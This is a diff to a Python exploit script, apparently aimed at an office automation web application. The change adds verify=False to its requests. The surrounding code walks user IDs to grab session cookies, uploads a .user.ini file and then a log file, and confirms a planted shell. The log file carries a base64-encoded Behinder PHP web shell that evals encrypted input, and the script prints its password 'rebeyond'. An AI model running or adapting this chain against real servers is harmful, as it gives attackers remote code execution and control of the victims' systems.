@@ -14,6 +14,8 @@ GREEN = '\033[1;32m'
 BOLD = '\033[1m'
 ENDC = '\033[0m'
 
+requests.packages.urllib3.disable_warnings()
+
 headers = {
     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
 }
@@ -32,7 +34,7 @@ def Target_Info(target_url):
     print(BLUE + '\n[*]正在获取版本信息\n' + ENDC)
     url = target_url + 'inc/expired.php'
     try:
-        response = requests.get(url=url, headers=headers, timeout=5)
+        response = requests.get(url=url, headers=headers, timeout=5, verify=False)
         pattern = re.compile('<td class="Big"><span class="big3">(.*?)</span>', re.S)
         info = re.findall(pattern, response.text)
         print(GREEN + info[0].replace('<br>', '').replace(' ', '').replace('	', '').strip() + '\n' + ENDC)
@@ -45,7 +47,7 @@ def Target_URL(target_url, uid):
     manage = target_url + "general/"
     print(BLUE + '[*]正在遍历UID=%d' % (uid) + ENDC)
     try:
-        response = requests.get(url=url, headers=headers, timeout=5)
+        response = requests.get(url=url, headers=headers, timeout=5, verify=False)
         if "RELOGIN" in response.text and response.status_code == 200:
             print(RED + '目标用户为离线状态\n' + ENDC)
         elif response.status_code == 200 and response.text == "":
@@ -72,7 +74,7 @@ def Upload_Ini(target_url, cookie):
     data = base64.b64decode(
         'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
     try:
-        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
+        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5, verify=False)
         if res.status_code == 200 and '档案已保存' in res.text:
             print(BLUE + '[*] 成功上传.user.ini文件!' + ENDC)
             Upload_Log(target_url, cookie)
@@ -94,7 +96,7 @@ def Upload_Log(target_url, cookie):
     data = base64.b64decode(
         'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocAplY2hvICdpdCB3b3JrJzsKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOwogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
     try:
-        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
+        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5, verify=False)
         if res.status_code == 200 and '档案已保存' in res.text:
             print(BLUE + '[*] 成功上传log文件!' + ENDC)
             Get_Shell(target_url, cookie)
@@ -112,7 +114,7 @@ def Get_Shell(target_url, cookie):
     }
     payload = 'general/reportshop/workshop/report/attachment-remark/form.inc.php'
     try:
-        res = requests.get(url=target_url + payload, headers=headers, timeout=5)
+        res = requests.get(url=target_url + payload, headers=headers, timeout=5, verify=False)
         if res.status_code == 200 and 'it work' in res.text:
             print(GREEN + '[+] 成功上传冰蝎三Shell, 密码为: rebeyond' + ENDC)
             print(GREEN + '[+] Shell地址为: {}'.format(target_url + payload) + ENDC)
